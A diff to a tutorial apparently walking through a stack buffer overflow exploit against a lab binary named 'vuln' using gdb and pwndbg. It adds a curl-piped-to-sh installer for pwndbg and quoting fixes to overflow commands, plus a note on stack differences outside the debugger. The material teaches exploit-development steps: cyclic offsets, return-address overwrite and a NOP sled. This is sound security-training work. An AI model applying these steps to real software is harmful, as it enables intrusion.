@@ -12,6 +12,13 @@
 
 - pwndbg
 
+    - Install the binary for the current user:
+
+    ```shell
+    curl --proto '=https' --tlsv1.2 -LsSf 'https://install.pwndbg.re' | sh -s -- -t pwndbg-gdb -u
+    ```
+
+    - or install using source code
     ```bash
     git clone https://github.com/pwndbg/pwndbg
     cd pwndbg
@@ -49,7 +56,7 @@ make vuln
 
 ```bash
 pwndbg ./vuln
-run $(python3 -c 'from pwn import *; print(cyclic(500))')
+run "$(python3 -c 'from pwn import *; print(cyclic(500))')"
 ```
 > Check the stack + registers. The stack was smashed!
 
@@ -84,7 +91,7 @@ As we can see, there is some issue with the aligment, we need to add 2 bytes to 
 
 ```bash
 break vuln # Add a breakpoint in the vuln function
-run $(python3 -c 'from pwn import *; import sys; print("A"*212 + "B"*4)')
+run "$(python3 -c 'from pwn import *; import sys; print(\"A\"*212 + \"B\"*4)')"
 n # Run one step to execute the strcpy function
 x/300x $esp
 info registers
@@ -154,10 +161,10 @@ Now, run the exploit in GDB adding a stopping the execution just after the stack
 ```bash
 gdb ./vuln
 break vuln
-run $(python3 exploit.py)
+run "$(python3 exploit.py)"
 break *0x80491c7 # Break at the RET from VUln
 c
-x/300x $esp # Look for the x90 block (should be in the stack as is passed as a parameter)
+x/100x $esp # Look for the x90 block (should be in the stack as is passed as a parameter)
 ```
 
 > 0xffffd12c -> %eip
@@ -174,9 +181,14 @@ sys.stdout.buffer.write(payload)
 ```
 
 ## Run the exploit
-./vuln $(python3 solution_exploit.py)
+./vuln "$(python3 solution_exploit.py)"
 
 Check the [solution file](./solution_exploit.py)
+
+There are some changes that in real life this doesn't work... Throwing a `segmentation fault (core dumped)`, that's because outside gdb the stack is created a bit different (env and params are different)
+
+> Debug using `coredumpctl info` and `coredumpctl debug`
+> Use GDB to  find the correct @ x/100x
 
 ## Cleanup
 
